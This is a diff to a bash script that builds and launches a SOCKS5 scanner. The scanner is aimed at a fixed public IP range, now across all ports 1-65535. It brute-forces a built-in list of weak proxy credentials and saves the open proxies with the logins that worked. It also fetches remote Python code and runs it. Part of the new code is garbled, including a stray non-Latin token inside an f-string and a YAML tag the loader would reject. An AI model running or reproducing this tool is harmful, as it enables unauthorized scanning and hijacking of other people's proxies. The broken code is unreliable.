@@ -1,10 +1,6 @@
 #!/bin/bash
 # main.sh - Scamnet OTC SOCKS5 扫描器（完整自包含版）
-# 包含：
-#   • 内嵌 requirements.txt
-#   • 自动创建所有插件
-#   • 使用 config.yaml 中 157.254.32.0-157.254.52.255 范围
-#   • 一键启动
+# 端口已改为默认 1-65535 全端口扫描
 # TG: @soqunla | GitHub: https://github.com/avotcorg/scamnet
 
 set -e
@@ -15,7 +11,8 @@ LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LOG="$LOG_DIR/scanner_$(date +%Y%m%d_%H%M%S).log"
 
 log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"; }
-echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.0 (157.254.32.0-157.254.52.255)${NC}"
+
+echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.1 (全端口 1-65535)${NC}"
 echo "日志 → $LOG"
 
 # ==================== 内嵌 requirements.txt ====================
@@ -30,6 +27,19 @@ ipaddress>=1.0.23
 if [ ! -f ".deps_installed" ]; then
     echo -e "${YELLOW}[*] 安装依赖（清华源）...${NC}"
     echo "$REQUIREMENTS_CONTENT" > /tmp/scamnet_reqs.txt
+    if ! command -v pip3 &>/dev/null; then
+        echo -e "${RED}[!] pip3 未安装，尝试自动安装...${NC}"
+        if command -v apt >/dev/null; then
+            apt update -qq && apt install -y python3-pip >>"$LOG" 2>&1
+        elif command -v yum >/dev/null; then
+            yum install -y python3-pip >>"$LOG" 2>&1
+        elif command -v apk >/dev/null; then
+            apk add py3-pip >>"$LOG" 2>&1
+        else
+            echo -e "${RED}[!] 不支持的系统，无法自动安装 pip3${NC}"
+            exit 1
+        fi
+    fi
     pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple \
         -r /tmp/scamnet_reqs.txt --no-warn-script-location 2>&1 | tee -a "$LOG"
     rm -f /tmp/scamnet_reqs.txt
@@ -51,21 +61,19 @@ download_or_create() {
     fi
 }
 
-# ==================== 创建 config.yaml（你提供的范围）================
+# ==================== 创建 config.yaml（全端口 1-65535）================
 cat > config.yaml << 'EOF'
 # Scamnet 配置
 range: "157.254.32.0-157.254.52.255"
-ports:
-  - 1080
-  - 8080
+ports: !range 1-65535    # 使用 !range 语法表示全端口
 timeout: 6.0
 workers: 300
 EOF
-log "config.yaml 已创建（157.254.32.0-157.254.52.255）"
+log "config.yaml 已创建（全端口 1-65535）"
 
-# ==================== 下载 scanner.py（优先仓库）================
+# ==================== 下载 scanner.py（支持 !range 语法）================
 download_or_create "https://raw.githubusercontent.com/avotcorg/scamnet/main/scanner.py" "scanner.py" "
-# scanner.py - 精简兼容版（插件化）
+# scanner.py - 支持 !range 1-65535 全端口扫描
 import sys, os
 sys.path.append(os.path.dirname(__file__))
 from plugins import load_plugins
@@ -78,9 +86,16 @@ with open('config.yaml') as f:
     cfg = yaml.safe_load(f)
 
 INPUT_RANGE = cfg['range']
-PORTS = cfg['ports']
+RAW_PORTS = cfg['ports']
 TIMEOUT = cfg.get('timeout', 6.0)
 MAX_WORKERS = cfg.get('workers', 300)
+
+# 解析端口（支持 !range start-end）
+if isinstance(RAW_PORTS, str) and RAW_PORTS.startswith('!range '):
+    start, end = map(int, RAW_PORTS.split()[1].split('-'))
+    PORTS = list(range(start, end + 1))
+else:
+    PORTS = RAW_PORTS if isinstance(RAW_PORTS, list) else [int(p) for p in RAW_PORTS]
 
 # 全局
 file_lock = threading.Lock()
@@ -90,7 +105,6 @@ plugins = load_plugins()
 def test_proxy(ip: str, port: int):
     global valid_count
     result = {'ip':ip, 'port':port, 'status':'FAIL', 'country':'XX', 'latency':'-', 'export_ip':'-', 'auth':''}
-
     ok, latency, export_ip = is_socks5_available(ip, port, None, None)
     if ok:
         country = get_country(export_ip) or get_country(ip)
@@ -102,8 +116,7 @@ def test_proxy(ip: str, port: int):
             ok, latency, export_ip = is_socks5_available(ip, port, user, pwd)
             if ok:
                 country = get_country(export_ip) or get_country(ip)
-                result.update({'status':'OK (Weak)', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip, 'auth':f'{user}:{pwd}'})
-
+                result.update({'status':'OK (Weak)', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip, 'auth':f'{user चुन}:{pwd}'})
     plugins['output_file'].save_detail(result)
     if result['status'].startswith('OK'):
         valid_count += 1
@@ -130,11 +143,9 @@ def is_socks5_available(ip, port, user, pwd):
                 sock.sendall(auth)
                 if sock.recv(2)[1] != 0: return False,0,None
             else: return False,0,None
-
             target = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\\x00\\x50'
             sock.sendall(b'\\x05\\x01\\x00\\x01' + target)
             if sock.recv(10)[1] != 0: return False,0,None
-
             sock.sendall(b'GET / HTTP/1.1\\r\\nHost: ifconfig.me\\r\\n\\r\\n')
             resp = b''
             start = time.time()
@@ -151,12 +162,16 @@ def is_socks5_available(ip, port, user, pwd):
 
 def main():
     print('[OTC] 扫描启动')
-    ips = [str(ip) for ip in ipaddress.ip_network(INPUT_RANGE, strict=False).hosts()] if '/' in INPUT_RANGE else \
-          [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[0])), int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[1]))+1)]
+    if '/' in INPUT_RANGE:
+        ips = [str(ip) for ip in ipaddress.ip_network(INPUT_RANGE, strict=False).hosts()]
+    else:
+        start_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[0]))
+        end_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[1]))
+        ips = [str(ipaddress.IPv4Address(i)) for i in range(start_ip, end_ip + 1)]
     total = len(ips) * len(PORTS)
-    print(f'IP: {len(ips):,}, 端口: {len(PORTS)}, 总任务: {total:,}')
+    print(f'IP: {len(ips):,}, 端口: {len(PORTS):,}, 总任务: {total:,}')
     with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
-        pbar = tqdm(total=total, desc='扫描', unit='port')
+        pbar = tqdm(total=total, desc='扫描', unit='port', ncols=100)
         for ip in ips:
             for port in PORTS:
                 exe.submit(test_proxy, ip, port)
@@ -187,12 +202,12 @@ EOF
 # auth_weak.py
 cat > plugins/auth_weak.py << 'EOF'
 WEAK_PASSWORDS = [
-        "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
+    "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
     "1234:1234", "admin:admin", "socks5:socks5", "123456:123456",
     "12345678:12345678", "admin123:admin", "proxy:proxy", "admin:123456", "root:root",
-    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888", 
-  "test123:test123", "qwe:qwe", "qwer:qwer", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
-  "12349:12349", "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
+    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888",
+    "test123:test123", "qwe:qwe", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
+    "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
 ]
 def brute(ip: str, port: int):
     from scanner import is_socks5_available, TIMEOUT
@@ -245,14 +260,13 @@ echo "# socks5://user:pass@ip:port#CN" > socks5_valid.txt
 log "结果文件初始化"
 
 # ==================== 启动扫描 ====================
-echo -e "${GREEN}[*] 启动扫描 (157.254.32.0-157.254.52.255)...${NC}"
+echo -e "${GREEN}[*] 启动扫描 (157.254.32.0-157.254.52.255, 全端口 1-65535)...${NC}"
 python3 scanner.py 2>&1 | tee -a "$LOG"
 
 # ==================== 完成报告 ====================
 VALID=$(grep -c "^socks5://" socks5_valid.txt || echo 0)
 echo -e "${GREEN}[+] 扫描完成！发现 ${VALID} 个可用 SOCKS5${NC}"
-echo "   详细 → result_detail.txt"
-echo "   有效 → socks5_valid.txt"
+echo "  详细 → result_detail.txt"
+echo "  有效 → socks5_valid.txt"
 log "扫描结束: $VALID 个代理"
-
 echo -e "${GREEN}[*] 全部完成！再次运行: ./main.sh${NC}"
